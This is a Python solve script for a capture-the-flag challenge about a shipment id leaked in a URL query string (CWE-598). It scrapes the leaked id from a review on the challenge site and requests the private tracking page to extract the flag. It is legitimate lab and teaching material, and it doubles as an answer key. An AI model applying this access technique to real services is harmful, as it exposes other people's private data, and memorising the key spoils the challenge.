#!/usr/bin/env python3
"""
QuickShip Tracker (auth, 100) — CWE-598, sensitive id leaked in a GET query string.

A VIP customer review pastes the private tracking link the support agent sent
them, exposing the shipment id in the URL: /track?sid=1fd5a60978436d3e.
Requesting that link returns the VIP's tracking page (the flag).

Usage:
    python3 solve.py                          # defaults to auth3.chal.deti:8062
    python3 solve.py http://auth3.chal.deti:8062
"""
import re
import sys
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth3.chal.deti:8062"
SID = "1fd5a60978436d3e"  # leaked in the review text on the landing page

FLAG_RE = re.compile(r"flag\{[^}]*\}")
# fallback: discover the sid straight from a leaked /track?sid=... link on any page
LINK_RE = re.compile(r"/track\?sid=([0-9a-fA-F]+)")


def fetch_flag(sid: str) -> str | None:
    r = requests.get(f"{BASE}/track", params={"sid": sid}, timeout=10)
    print(f"[{r.status_code}] GET {BASE}/track?sid={sid}")
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


def main() -> int:
    flag = fetch_flag(SID)
    if not flag:
        # sid changed? re-scrape it from the homepage review text
        home = requests.get(f"{BASE}/", timeout=10).text
        found = LINK_RE.search(home)
        if found:
            print(f"[i] re-discovered sid from homepage: {found.group(1)}")
            flag = fetch_flag(found.group(1))

    if flag:
        print(f"[+] FLAG: {flag}")
        return 0
    print("[-] no flag found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
